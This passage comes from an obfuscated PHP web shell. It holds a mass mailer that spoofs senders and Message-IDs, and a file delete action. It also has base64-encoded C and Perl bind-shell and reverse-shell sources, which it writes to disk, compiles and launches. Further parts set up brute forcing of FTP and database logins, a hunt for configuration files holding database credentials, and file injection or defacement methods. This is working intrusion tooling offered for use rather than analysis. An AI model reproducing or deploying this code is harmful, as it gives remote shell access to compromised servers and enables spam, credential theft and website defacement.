,'2') ); } } if(@isset($lsall)&&@isset($action)&&$action!=''){ $lsall_arr=array(); $tlsall_arr=@explode("\n",$lsall); foreach($tlsall_arr as $tls){ $tls=@trim($tls); if(!@empty($tls)&&!@in_array($tls,$lsall_arr)){ $lsall_arr[]=$tls; } } if(@count($lsall_arr)>0){ foreach($lsall_arr as $dfls){ if(@isset($use_buffer)&&$use_buffer&&@isset($bcopy)&&@isset($bcut)&&@is_array($bcopy)&&@is_array($bcut)){ switch($action){ case 'bcopy': if(!@in_array($dfls,$bcopy)){ z1o($dfls,'bcopy'); } break; case 'bcut': if(!@in_array($dfls,$bcut)){ z1o($dfls,'bcut'); } break; case 'bunsetcopy': if(@in_array($dfls,$bcopy)){ z1o($dfls,'bcopy'); } break; case 'bunsetcut': if(@in_array($dfls,$bcut)){ z1o($dfls,'bcut'); } break; case 'bunsetall': if(@in_array($dfls,$bcopy)){ z1o($dfls,'bcopy'); } elseif(@in_array($dfls,$bcut)){ z1o($dfls,'bcut'); } break; default: break; } } switch($action){ case 'delete': if(z4r($dfls)){ z8s($dfls); } break; default: break; } } if(@isset($use_buffer)&&$use_buffer) z0j(); } } if($act=='mailer'){ $smsg=$cmsg=''; $s_ok=$c_ok=0; if(@isset($m1_submit)&&$m1_submit){ if(@empty($m1_name)||@empty($m1_from)||@empty($m1_subj)||@empty($m1_msg)||$m1_msg=="message"||@empty($m1_emails)||!@strstr($m1_emails,"@")){ $smsg=" : ".z9y("236"); } else { $s_ok=1; } } elseif(@isset($m2_submit)&&$m2_submit){ if(@empty($m2_name)||@empty($m2_from)||@empty($m2_subj)||@empty($m2_msg)||@empty($m2_csv)||!@preg_match('/"(.*?)"\s*,\s*"(.*?)"/',$m2_csv)){ $cmsg=" : ".z9y("236"); } else { $c_ok=1; } } if(!@isset($m1_msg)||@empty($m1_msg)) $m1_msg="message"; if(!@isset($m1_emails)||@empty($m1_emails)) $m1_emails="e-mails"; if(!@isset($m2_prefix)||@empty($m2_prefix)) $m2_prefix="column_prefix_"; if(!@isset($m2_ecol)||!@is_numeric($m2_ecol)) $m2_ecol="0"; if(!@isset($m2_msg)||@empty($m2_msg)) $m2_msg="Hello ".$m2_prefix."1,\r\n\r\nYour Address: ".$m2_prefix."2\r\nYour Phone: ".$m2_prefix."3\r\n\r\nE-mail sent to: ".$m2_prefix."0"; if(!@isset($m2_csv)||@empty($m2_csv)) $m2_csv='"john@email","john","john\'s address","0123456789"'."\r\n".'"jane@email","jane","jane\'s address","9876543210"'; echo z3q(array(z9y("212").$smsg, z9y("213").$cmsg),'46'); echo z9m('2').z7o().z7j('','4'); echo z10w( z5b().z9d(z9c(z10w( z5x(array("act"=>"mailer","d","m1_submit"=>"1"), z7u(z9c(z7n(z9y("214"))).z6z(z5y('m1_name','','7'))). z7u(z9c(z7n(z9y("215"))).z6z(z5y('m1_from','','7'))). z7u(z9c(z7n(z9y("216"))).z6z(z5y('m1_subj','','7'))). z7u(z6x(z5w('m1_msg','3').$m1_msg.z5q(),'2')). z7u(z6x(z5w('m1_emails','3').$m1_emails.z5q(),'2')). z7u(z6x(z10w(z7u(z9c(z7n(z9y("217")).z5y('m1_str','','4')).z9c(z7n(z9y("218")).z3m('m1_replace', array(""=>z9y("223"), "name"=>z9y("224"), "email1"=>z9y("225"), "email2"=>z9y("226"), "emailhash"=>z9y("227")),'4',1)).z9c(z7n(z9y("219")).z3m("m1_where",array( "subject"=>z9y("228"), "message"=>z9y("229"), ""=>z9y("230")),'5',1))),'2'),'2')). z7u(z6x(z10w(z7u(z9c(z5u("m1_rand1",z9y("231"),"m1_rand1"),'','4').z9c(z5u("m1_rand2",z9y("232"),"m1_rand2"),'','4')),'2'),'2')).z5b(). z7u(z6x(z8b(z9y("233"),'7').z5u('m1_preview',z9y("234"),'m1_preview'),'2')) ),'2'),'20')). z5b() ,'2'); echo z7f().z7j('','46'); echo z10w( z5b().z9d(z9c(z10w( z5x(array('act'=>'mailer',"d",'m2_submit'=>'1'), z7u(z9c(z7n(z9y("214"))).z6z(z5y('m2_name','','7'))). z7u(z9c(z7n(z9y("215"))).z6z(z5y('m2_from','','7'))). z7u(z9c(z7n(z9y("216"))).z6z(z5y('m2_subj','','7'))). z7u(z6x(z5w('m2_msg','3').$m2_msg.z5q(),'2')). z7u(z6x(z5w('m2_csv','3').$m2_csv.z5q(),'2')). z7u(z6x(z10w(z7u(z9c(z7n(z9y("220")).z6u('m2_ecol',$m2_ecol,'6')).z9c(z7n(z9y("221")).z5y('m2_prefix','','4')).z9c(z7n(z9y("222")).z3m('m2_where',array( "message"=>z9y("229"), ""=>z9y("230")),"4",1))),'2'),'2')). z7u(z6x(z10w(z7u(z9c(z5u("m2_rand1",z9y("231"),"m2_rand1"),'','4').z9c(z5u("m2_rand2",z9y("232"),"m2_rand2"),'','4')),'2'),'2')).z5b(). z7u(z6x(z8b(z9y("233"),'7').z5u('m2_preview',z9y("234"),"m2_preview").' '.z5u('m2_verbose',z9y("235"),"m2_verbose"),'2')) ),'2'),'20')). z5b() ,'2'); echo z7f().z7y().z10q(); if($s_ok||$c_ok){ $host=array("aol.com","att.net","bellsouth.net","comcast.net","email.com","gmail.com","googlemail.com","hotmail.com","juno.com","live.com","lycos.com","mail.com","mindspring.com","msn.com","pacbell.com","post.com","prodigy.net","rocketmail.com","sbcglobal.net","usa.com","yahoo.com","ymail.com"); $ch=(@count($host)-1); $i=1; $m_success=0; $m_failed=0; $all_failed=array(); if($s_ok){ echo z9m('2').z7u( z9c(z9y("237"),'8','2').z9c(z9y("238"),'8').z9c(z9y("239"),'8').z9c(z9y("240"),'8').z9c(z9y("241"),'8','3') ); $m_all=@explode("\n",$m1_emails); $m_all=@array_unique($m_all); $m_count=@count($m_all); $m_len=@strlen($m_count); z5o(); foreach($m_all as $m_mail){ $from=$m1_from; if(@isset($m1_rand1)&&$m1_rand1){ $from=@str_replace("@",@rand(100000,999999)."@",$from); } if(isset($m1_rand2)&&$m1_rand2){ $hr=@rand(0,$ch); $m_msgid=@md5(@uniqid(@time()))."@".$host[$hr]; }else{ $m_msgid=@md5(@uniqid(@time()))."@".$_SERVER["SERVER_NAME"]; } $header=""; $header.="From: $m1_name <$from>\n"; $header.="Reply-To: <$from>\n"; $header.="Message-ID: <".$m_msgid.">\n"; $header.="MIME-Version: 1.0\n"; $date=@date("Y-m-d"); $header.="Date: $date\n"; $header.="Content-Type: text/html; charset=UTF-8\n"; $header.="Content-Transfer-Encoding: 8bit\n\n"; $m_msg=$m1_msg; $m_subj=$m1_subj; if(@isset($m1_str)&&!@empty($m1_str)&&@isset($m1_replace)&&!@empty($m1_replace)){ if($m1_replace=="name"){ if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="message") $m_msg=@str_replace($m1_str,$m1_name,$m_msg); if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="subject") $m_subj=@str_replace($m1_str,$m1_name,$m_subj); }elseif($m1_replace=="email1"){ if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="message") $m_msg=@str_replace($m1_str,$m1_from,$m_msg); if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="subject") $m_subj=@str_replace($m1_str,$m1_from,$m_subj); }elseif($m1_replace=="email2"){ if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="message") $m_msg=@str_replace($m1_str,$m_mail,$m_msg); if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="subject") $m_subj=@str_replace($m1_str,$m_mail,$m_subj); }elseif($m1_replace=="emailhash"){ if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="message") $m_msg=@str_replace($m1_str,@md5($m_mail),$m_msg); if(!@isset($m1_where)||@empty($m1_where)||$m1_where=="subject") $m_subj=@str_replace($m1_str,@md5($m_mail),$m_subj); } } $m_pad=""; if(@strlen($i)<$m_len) $m_pad=@str_repeat("0",($m_len-@strlen($i))); if(!@empty($m_mail)){ if(@isset($m1_preview)&&$m1_preview){ if($i>5) break; echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').z9c($m_msgid,'14').z9c(z5p(z9y("245")),'14','3'),($i%2?'0':'1')); }elseif(@mail($m_mail,$m_subj,$m_msg,$header)){ echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').z9c($m_msgid,'14').z9c(z5p(z9y("243")),'14','3'),($i%2?'0':'1')); z5o(); $m_success++; }else{ echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').z9c($m_msgid,'14').z9c(z8k(z9y("244")),'14','3'),($i%2?'0':'1')); z5o(); $all_failed[]=$m_mail; $m_failed++; } $i++; } } } elseif($c_ok){ $fcsv=@str_replace("\r","\n",$m2_csv); $fcsv=z2v("\n\n","\n",$fcsv); $csv=z5s($fcsv); echo z9m('2').z7u( z9c(z9y("237"),'8','2').z9c(z9y("238"),'8').z9c(z9y("239"),'8').((@isset($m2_verbose)&&$m2_verbose)?z9c(z9y("242"),'8'):'').z9c(z9y("240"),'8').z9c(z9y("241"),'8','3') ); $m_count=@count($csv); $m_len=@strlen($m_count); z5o(); foreach($csv as $str_csv){ if(@is_array($str_csv)){ $from=$m2_from; $m_mail=$str_csv[$m2_ecol]; if(@isset($m2_rand1)&&$m2_rand1){ $from=@str_replace("@",@rand(100000,999999)."@",$from); } if(isset($m2_rand2)&&$m2_rand2){ $hr=@rand(0,$ch); $m_msgid=@md5(@uniqid(@time()))."@".$host[$hr]; }else{ $m_msgid=@md5(@uniqid(@time()))."@".$_SERVER["SERVER_NAME"]; } $header=""; $header.="From: $m2_name <$from>\n"; $header.="Reply-To: <$from>\n"; $header.="Message-ID: <".$m_msgid.">\n"; $header.="MIME-Version: 1.0\n"; $date=@date("Y-m-d"); $header.="Date: $date\n"; $header.="Content-Type: text/html; charset=UTF-8\n"; $header.="Content-Transfer-Encoding: 8bit\n\n"; $m_msg=$m2_msg; $m_subj=$m2_subj; $repl=array(); for($si=(@count($str_csv)-1);$si>=0;$si--){ if(@empty($m2_where)){ $m_msg=@str_replace($m2_prefix.$si,$str_csv[$si],$m_msg); $m_subj=@str_replace($m2_prefix.$si,$str_csv[$si],$m_subj); $repl[]=$m2_prefix.$si." = ".$str_csv[$si].z9z(); }else{ $m_msg=@str_replace($m2_prefix.$si,$str_csv[$si],$m_msg); $repl[]=$m2_prefix.$si." = ".$str_csv[$si].z9z(); } } $replacing=(@count($repl)>0?@implode('',@array_reverse($repl)):''); $m_pad=""; if(@strlen($i)<$m_len) $m_pad=@str_repeat("0",($m_len-@strlen($i))); if(!@empty($m_mail)){ if(@isset($m2_preview)&&$m2_preview){ if($i>5) break; echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').((@isset($m2_verbose)&&$m2_verbose)?z9c($replacing,'14'):'').z9c($m_msgid,'14').z9c(z5p(z9y("245")),'14','3'),($i%2?'0':'1')); } elseif(@mail($m_mail,$m_subj,$m_msg,$header)){ echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').((@isset($m2_verbose)&&$m2_verbose)?z9c($replacing,'14'):'').z9c($m_msgid,'14').z9c(z5p(z9y("243")),'14','3'),($i%2?'0':'1')); z5o(); $m_success++; }else{ echo z9d(z9c($m_pad.$i,'14','2').z9c($m_mail,'14').z9c($from,'14').((@isset($m2_verbose)&&$m2_verbose)?z9c($replacing,'14'):'').z9c($m_msgid,'14').z9c(z8k(z9y("244")),'14','3'),($i%2?'0':'1')); z5o(); $all_failed[]=$m_mail; $m_failed++; } $i++; } } } echo z10q(); } if(!@isset($m2_preview)||!$m2_preview){ echo z6s().z10w(z7u(z6l(z9y("426",$m_count).z9x().z9y("427",$m_success).z9x().z9y("428",$m_failed).($m_failed>0?z9x().z9y("431"):''))),'2'); if(@count($all_failed)>0){ echo z10w(z9d(z6l(z5w('','1',1).@implode("\n",@array_unique($all_failed)).z5q())),'2'); } } } } if($act=='encoders'){ $hash_algos=array(''=>z9y("260")); if(!@isset($hash_input)) $hash_input=''; if(z7e("hash_algos")&&@z7e("hash")){ $hfnc=1; $hashes=@hash_algos(); } else { $hfnc=0; $hashes=array(); foreach(array("md5","sha1","crc32") as $hh){ if(z7e($hh)) $hashes[]=$hh; } } foreach($hashes as $ha) $hash_algos[$ha]=$ha; $encode_functions=z1e(); $submited=0; if(@isset($submit_encode)&&$submit_encode&&@isset($encoder_input)&&!@empty($encoder_input)) $submited=1; $encoder_output=""; if(!@isset($ip_input)||@empty($ip_input)){ $ip_input=$saddr; } echo z3q(array(z9y("246"),z9y("253")),"46"); echo z9m(2). z7o(). z7j('','4').z6s(). z9m('2').z9k('','hash_form').z9v("act","encoders").z9v("d").z9v("htype","1").z7u(z5t(z9y("247")).z9c(z5y("hashinput","","5").z8b(z9y("248"),'7').z8m(z9y("250"),'document.hash_form.hashinput.value=\'\';','7'))).z9l().z10q(); if(@isset($htype)&&$htype){ echo z10w(z9d(z5t(z9y("251")).z9c(z5w('','6').z2e($hashinput).z5q())),"2"); } echo z7f().z7j('','46'). z6s(). z9m('2').z9k('',"ip_form").z9v("act","encoders").z9v("d").z9v("submit_ip","1").z7u(z5t(z9y("254")).z9c(z6u("ip_input",@htmlspecialchars($ip_input),'5').z8b(z9y("248"),'7').z8m(z9y("250"),'document.ip_form.ip_input.value=\'\';','7'))).z9l().z10q(); if(@isset($submit_ip)&&$submit_ip=="1"&&@isset($ip_input)&&!@empty($ip_input)){ echo z9m('2').z7u(z5t(z9y("255")).z9c(z8g(sprintf("%u",@ip2long($ip_input)),"0").z9x().z10t('http://'.@sprintf("%u",@ip2long($ip_input)).'/',z9y("252"),"1",1))). z7u(z5t(z9y("256")).z9c(z8g((z2z($ip_input)=="failed")?"failed":z2z($ip_input),"0").((z2z($ip_input)=="failed")?"":z9x().z10t('http://'.z2z($ip_input).'/',z9y("252"),"1",1)))). z7u(z5t(z9y("257")).z9c(z8g((z1u($ip_input)=="failed")?"failed":z1u($ip_input),"0").((z1u($ip_input)=="failed")?"":z9x().z10t('http://'.z1u($ip_input).'/',z9y("252"),"1",1)))).z10q(); } echo z6s(); echo z7f(). z7y(). z10q(); echo z3q(array(z9y("432"),z9y("433")),'46'); echo z9m(2). z7o(). z7j('','4').z6s(). z9m('2').z9k('',"hashing_form").z9v("act","encoders").z9v("d"). z7u(z5t(z9y("258")).z9c(z3m('hash_type',$hash_algos,'5',1).z8b(z9y("249"),'7').z8m(z9y("250"),'document.hashing_form.hash_input.value=\'\';','7'))). z9d(z5t(z9y("259")).z9c(z5w('hash_input','6').(@isset($hash_input)?@htmlspecialchars($hash_input):'').z5q())). z9l().z10q(). z6s(). z7f().z7j('','46'). z6s(). z9m('2').z9k('',"encoder_form").z9v("d").z9v("act","encoders").z9v("submit_encode","1"). z7u(z5t(z9y("91")).z9c(z3m("encode_selected",$encode_functions,"5",1,'').z8b(z9y("249"),'7').z8m(z9y("250"),'document.encoder_form.encoder_input.value=\'\';','7'))). z9d(z5t(z9y("259")).z9c(z5w('encoder_input','6').(@isset($encoder_input)?@htmlspecialchars($encoder_input):'').z5q())). ($submited?z7u(z5t(z9x()).z9c(z8m(z9y("263"),'document.output_form.encoder_output.value=\'\';','7').z8m(z9y("264"),'document.encoder_form.encoder_input.value=document.output_form.encoder_output.value;','7'))):''). z9l().z10q(). z6s(). z7f(). z7y(). z10q(); if(@isset($hash_input)&&!@empty($hash_input)){ echo z3q(z9y("261")).z6s(); echo z9m('2'); if(@count($hashes)>0){ if(@isset($hash_type)&&@in_array($hash_type,$hashes)){ echo z7u(z5t($hash_type).z9c(z8g(($hfnc?@hash($hash_type,$hash_input):$hash_type($hash_input)),'7'))); } else { foreach($hashes as $k){ echo z7u(z5t($k).z9c(z8g(($hfnc?@hash($k,$hash_input):$k($hash_input)),'7'))); } } } echo z10q().z6s(); } if($submited){ $encoder_output=$encode_selected($encoder_input); echo z3q(z9y("262")).z6s().z9m('2').z9k('',"output_form").z9d(z6l(z5w('encoder_output','1').@htmlspecialchars($encoder_output).z5q())).z9l().z10q().z6s(); } } if($act=='tools'){ $bndprt_c="I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5ncy5oPgojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CgojZGVmaW5lIFAwUlQgJXBvcnQlCiNkZWZpbmUgUEFTUyAiJXBhc3MlIgoKaW50Cm1haW4oaW50IGEsIGNoYXIgKipiKQp7CmludCBjLCBkLCBlID0gc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbiksIGY7CmNoYXIgcFsxMDAwXTsKc3RydWN0IHNvY2thZGRyX2luIGwsIHI7CnNpZ25hbChTSUdDSExELCBTSUdfSUdOKTsKc2lnbmFsKFNJR0hVUCwgU0lHX0lHTik7CnNpZ25hbChTSUdURVJNLCBTSUdfSUdOKTsKc2lnbmFsKFNJR0lOVCwgU0lHX0lHTik7CmlmIChmb3JrKCkpCmV4aXQoMCk7Cmwuc2luX2ZhbWlseSA9IEFGX0lORVQ7Cmwuc2luX3BvcnQgPSBodG9ucyhQMFJUKTsKbC5zaW5fYWRkci5zX2FkZHIgPSBJTkFERFJfQU5ZOwpiemVybygmKGwuc2luX3plcm8pLCA4KTsKYyA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7CmJpbmQoYywoc3RydWN0IHNvY2thZGRyICopICZsLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSk7Cmxpc3RlbihjLCAzKTsKd2hpbGUgKChkID0gYWNjZXB0KGMsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnIsICZlKSkpCnsKaWYgKCFmb3JrKCkpCnsKcmVjdihkLCBwLCAxMDAwLCAwKTsKaWYgKGNocGFzcyhQQVNTLHApKQp7CmNsb3NlKGQpOwpleGl0KDEpOwp9CmNsb3NlKDApOwpjbG9zZSgxKTsKY2xvc2UoMik7CmR1cDIoZCwgMCk7CmR1cDIoZCwgMSk7CmR1cDIoZCwgMik7CnNldGVudigiUEFUSCIsICIvc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbjovdXNyL2xvY2FsL2Jpbi86L3Vzci9sb2NhbC9zYmluOi4iLCAxKTsKdW5zZXRlbnYoIkhJU1RTQVZFIik7CnVuc2V0ZW52KCJISVNURklMRSIpOwpleGVjbCgiL2Jpbi9zaCIsICJzaCIsIChjaGFyICopIDApOwpjbG9zZShkKTsKZXhpdCgwKTsKfQp9CnJldHVybiAwOwp9CgppbnQgY2hwYXNzKGNoYXIgKmJhc2UsIGNoYXIgKmVudGVyZWQpIHsKaW50IGk7CmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSAKewppZihlbnRlcmVkW2ldID09ICdcbicpCmVudGVyZWRbaV0gPSAnXDAnOyAKaWYoZW50ZXJlZFtpXSA9PSAnXHInKQplbnRlcmVkW2ldID0gJ1wwJzsKfQppZiAoIXN0cmNtcChiYXNlLGVudGVyZWQpKQpyZXR1cm4gMDsKfQo="; $bndprt_pl="IyEvdXNyL2Jpbi9wZXJsCiRTSEVMTD0iL2Jpbi9zaCI7CiRMSVNURU5fUE9SVD0lcG9ydCU7CnVzZSBTb2NrZXQ7CiRwcm90b2NvbD1nZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTLCZQRl9JTkVULCZTT0NLX1NUUkVBTSwkcHJvdG9jb2wpIHx8IGRpZSAiQ2FudCBjcmVhdGUgc29ja2V0XG4iOwpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7CmJpbmQoUyxzb2NrYWRkcl9pbigkTElTVEVOX1BPUlQsSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7Cmxpc3RlbihTLDMpIHx8IGRpZSAiQ2FudCBsaXN0ZW4gcG9ydFxuIjsKd2hpbGUoMSkKewphY2NlcHQoQ09OTixTKTsKaWYoISgkcGlkPWZvcmspKQp7CmRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsKb3BlbiBTVERJTiwiPCZDT05OIjsKb3BlbiBTVERPVVQsIj4mQ09OTiI7Cm9wZW4gU1RERVJSLCI+JkNPTk4iOwpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsKY2xvc2UgQ09OTjsKZXhpdCAwOwp9Cn0KCg=="; $bckcon_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; $bckcon_c="I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pCnsKIGludCBmZDsKIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47CiBjaGFyIHJtc1syMV09InJtIC1mICI7IAogZGFlbW9uKDEsMCk7CiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7CiBzaW4uc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMl0pKTsKIHNpbi5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoYXJndlsxXSk7IAogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyAKIGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkgOyAKIGlmICgoY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmc2luLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSkpPDApIHsKICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7CiAgIGV4aXQoMCk7CiB9CiBzdHJjYXQocm1zLCBhcmd2WzBdKTsKIHN5c3RlbShybXMpOyAgCiBkdXAyKGZkLCAwKTsKIGR1cDIoZmQsIDEpOwogZHVwMihmZCwgMik7CiBleGVjbCgiL2Jpbi9zaCIsInNoIiwgTlVMTCk7CiBjbG9zZShmZCk7IAp9Cgo="; $bndportsrcs=array("bndprt.pl"=>array("PERL", "perl %path"), "bndprt.c"=>array("C","%path")); $bcsrcs=array("bckcon.pl"=>array("PERL","perl %path %host %port"), "bckcon.c"=>array("C","%path %host %port")); if(!@isset($brtest1)) $brtest1=0; if(!@isset($brtest2)) $brtest2=0; if(!@isset($brtest3)) $brtest3=0; if(!@isset($brtest4)) $brtest4=0; $users=array(); if(@empty($brute_email)) $brute_email=z7z('2',"email"); if(@empty($dv_email)) $dv_email=z7z('2',"email"); if(@empty($cp_email)) $cp_email=z7z('2',"email"); if(@isset($brm)&&($brm=="2"||$brm=="3")){ $users=z8l(); } $brute_type["1"]=z9y("343"); if($bpasswd){ $brute_type["2"]=z9y("344"); $brute_type["3"]=z9y("345"); } $available_arr=array(); if($bftp) $available_arr["FTP"]="FTP"; if($bmysql) $available_arr["MySQL"]="MySQL"; if($bmssql) $available_arr["MSSQL"]="MSSQL"; if($bpostgres) $available_arr["PostgreSQL"]="PostgreSQL"; if($boracle) $available_arr["Oracle"]="Oracle"; if(!@isset($brh)) $brh=$saddr; if(!@isset($dvfiles)) $dvfiles="*conf*.php;*db*.php;"; if(!@isset($dvuser)) $dvuser="user"; if(!@isset($dvpass)) $dvpass="pass"; if(!@isset($dvhost)) $dvhost="host"; if(!@isset($dvbase)) $dvbase="base"; $arr_vars=array("var"=>"variable (\$var)","arrayvar1"=>"arrayvar ('var'=>)","arrayvar2"=>"arrayvar (['var']=>)","const"=>"constant (define)"); $rec_arr=array(); for($i=0;$i<10;$i++) $rec_arr[($i+1)]=($i+1)." DIRS"; $rec_arr["no"]="NO"; $arr_dvfind=array("dvdir"=>z9y("301")); $arr_method=array("cpdir"=>z9y("304")); if(($wwwdir=z3n())!==false){ $arr_dvfind["docroot"]=z9y("326"); $arr_method["cpdocroot"]=z9y("305"); } if($bpasswd){ $arr_dvfind["passwd"]=z9y("327"); $arr_method["cppasswd"]=z9y("306"); } $inj_method=array( "top"=>"Top of the file" ,"end"=>"End of the file" ,"php1"=>"Before first &lt;?" ,"html1"=>"Before &lt;html&gt;" ,"html2"=>"Before &lt;/html&gt;" ,"body1"=>"Before &lt;body.*&gt;" ,"body2"=>"Before &lt;/body&gt;" ,"php2"=>"After last ?&gt;" ,"body3"=>"After &lt;body.*&gt;" ,"body4"=>"After &lt;/body&gt;" ,"html3"=>"After &lt;html&gt;" ,"html4"=>"After &lt;/html&gt;" ,"overwrite"=>"Deface (Overwrite file)" ); if(!@isset($bnd_port)||!@is_numeric($bnd_port)) $bnd_port=z7z('2','bind_port'); if(!@isset($bnd_pass)||@empty($bnd_pass)) $bnd_pass=z7z('2','bind_pass'); if(!@isset($bc_host)||@empty($bc_host)) $bc_host=$yaddr; if(!@isset($bc_port)||!@is_numeric($bc_port)) $bc_port=z7z('2','backcon_port'); $bindmsg=$bcmsg=""; if(@isset($bindsubmit)&&$bindsubmit){ $v=$bndportsrcs[$bnd_src]; if(@empty($v)){ $bindmsg=z9y("272"); }elseif(@fsockopen("localhost",$bnd_port,$errno,$errstr,0.1)){ $bindmsg=z9y("275",$bnd_port); }else{ $w=@explode(".",$bnd_src); $ext=$w[@count($w)-1]; unset($w[count($w)-1]); $srcpath=$tempdir.@join(".",$w).".".@md5(@time()).".".$ext; $binpath=$tempdir.@join(".",$w).@md5(@time()); if($ext=="pl"){ $binpath=$srcpath; } @unlink($srcpath); $fp=@fopen($srcpath,"ab+"); if(!$fp){ $bindmsg=z9y("271"); }else{ $data=@base64_decode(${@str_replace('.','_',$bnd_src)}); $data=@str_replace("%pass%",$bnd_pass,$data); $data=@str_replace("%port%",$bnd_port,$data); @fwrite($fp,$data,@strlen($data)); @fclose($fp); if($ext=="c"){ $retgcc=z9e("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath); } $v[1]=@str_replace("%path",$binpath,$v[1]); $v[1]=@str_replace("//","/",$v[1]); $retbind=z9e($v[1]." > /dev/null &"); @sleep(5); $sock=@fsockopen("localhost",$bnd_port,$errno,$errstr,5); if(!$sock){ $bindmsg=z9y("273",$bnd_port); }else{ $bindmsg=z9y("274",array($saddr,$bnd_port)); } } } } if(@isset($bcsubmit)&&$bcsubmit){ $v=$bcsrcs[$bc_src]; if(@empty($v)){ $bcmsg=z9y("272"); }else{ $w=@explode(".",$bc_src); $ext=$w[count($w)-1]; unset($w[count($w)-1]); $srcpath=$tempdir.join(".",$w).".".@md5(@time()).".".$ext; $binpath=$tempdir.join(".",$w).@md5(@time()); if($ext=="pl"){ $binpath=$srcpath; } @unlink($srcpath); $fp=@fopen($srcpath,"ab+"); if(!$fp){ $bcmsg=z9y("271"); }else{ $data=@base64_decode(${str_replace('.','_',$bc_src)}); @fwrite($fp,$data,strlen($data)); fclose($fp); if($ext=="c"){ $retgcc=z9e("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath); } $v[1]=@str_replace("%path",$binpath,$v[1]); $v[1]=@str_replace("%host",$bc_host,$v[1]); $v[1]=@str_replace("%port",$bc_port,$v[1]); $v[1]=@str_replace("//","/",$v[1]); $retbind=z9e($v[1]." > /dev/null &"); $bcmsg=z9y("76",array($bc_host,$bc_port)); } } } $selecta=$selectb=array(); foreach($bndportsrcs as $k=>$v) $selecta[$k]=$v[0]; foreach($bcsrcs as $k=>$v) $selectb[$k]=$v[0]; if(!$win&&($sh_exec||$safe_exec)){ echo z3q(array(z9y("265").(!@empty($bindmsg)?" - ".@strtoupper($bindmsg):""),z9y("266").(!@empty($bcmsg)?" - ".@strtoupper($bcmsg):"")),'46'); echo z9m(2).z7o().z7j('','4'); echo z5x(array("act"=>"tools","d","bindsubmit"=>"1"),z10w(z5b().z7u(z5t(z9y("267")).z9c(z6u("bnd_pass",$bnd_pass,'4').":".z6u("bnd_port",$bnd_port,'1').":".z3m("bnd_src",$selecta,'1',1).z8b(z9y("268"),'7'))).z5b(),'2')); echo z7f().z7j('','46'); echo 